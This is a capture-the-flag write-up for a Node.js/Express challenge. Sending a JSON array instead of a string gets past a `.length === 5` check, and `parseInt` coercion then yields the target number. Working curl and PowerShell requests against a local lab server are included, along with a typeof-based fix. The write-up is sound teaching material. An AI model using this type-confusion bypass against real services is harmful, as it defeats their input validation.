# CTF: Web Len5 — Type Confusion / Array Length Bypass

**Category:** Web Exploitation  
**Platform:** CyberHero Playground  
**Tools:** PowerShell / curl / Burp Suite


---

## Challenge Description

A web form accepts a number input and sends it as JSON to a Node.js/Express backend.
The goal is to bypass the server-side validation and retrieve the flag.

**Provided files:** `app.js`, `index.html`, `Dockerfile`, `docker-compose.yml`

---

## Source Code Analysis

The relevant validation logic in `app.js`:

```javascript
const { num } = req.body;

if (num && num.length === 5) {
    const i = parseInt(num, 10);
    if (i === 767879) {
        return res.status(200).send(`Congratulations! ${flag}`);
    }
    return res.status(200).send("Cheers!");
}

if (num && num.length > 5) {
    return res.status(200).send("Long");
}

return res.status(200).send("Nope");
```

The developer intended `num` to be a string of exactly 5 characters.
The number 767879 has 6 digits — so sending it as a plain string fails
the `length === 5` check and returns "Long".

---

## Vulnerability — Type Confusion

The server never validates the **type** of `num` — it only checks `.length`.

In JavaScript:
- `"12345".length === 5`  → string with 5 chars
- `[1,2,3,4,5].length === 5` → array with 5 elements ✓

Both pass `num.length === 5`, but `num` can be an **array** instead of a string.

### The parseInt trick

```javascript
parseInt([767879, 0, 0, 0, 0], 10)
```

`parseInt` first converts the array to a string:
```
[767879, 0, 0, 0, 0] → "767879,0,0,0,0"
```

Then parses from the beginning until a non-numeric character:
```
"767879,0,0,0,0" → 767879 ✓
```

Both conditions are satisfied simultaneously:
- `num.length === 5` ✓ (array has 5 elements)
- `parseInt(num, 10) === 767879` ✓

---

## Exploit

The frontend form only sends strings, so the exploit requires
sending the request directly, bypassing the UI entirely.

**PowerShell:**
```powershell
Invoke-RestMethod -Uri "http://localhost:1312/" `
  -Method POST `
  -ContentType "application/json" `
  -Body '{"num":[767879,0,0,0,0]}'
```

**curl:**
```bash
curl -X POST http://localhost:1312/ \
  -H "Content-Type: application/json" \
  -d '{"num":[767879,0,0,0,0]}'
```

**Response:**
```
Congratulations! SCC{...}
```

---

## Running Locally

```bash
docker-compose up
# or
npm install && node app.js
```

Server runs on `http://localhost:1312`

---

## Lessons Learned

- Never trust client-side validation — always enforce type checking server-side
- In JavaScript, `.length` works on both strings and arrays —
  always validate `typeof num === 'string'` before using length checks
- `parseInt()` silently coerces arrays to strings, creating unexpected behavior
- Bypassing frontend forms by sending raw HTTP requests is a
  fundamental web exploitation technique
- Fix: `if (typeof num === 'string' && num.length === 5)`
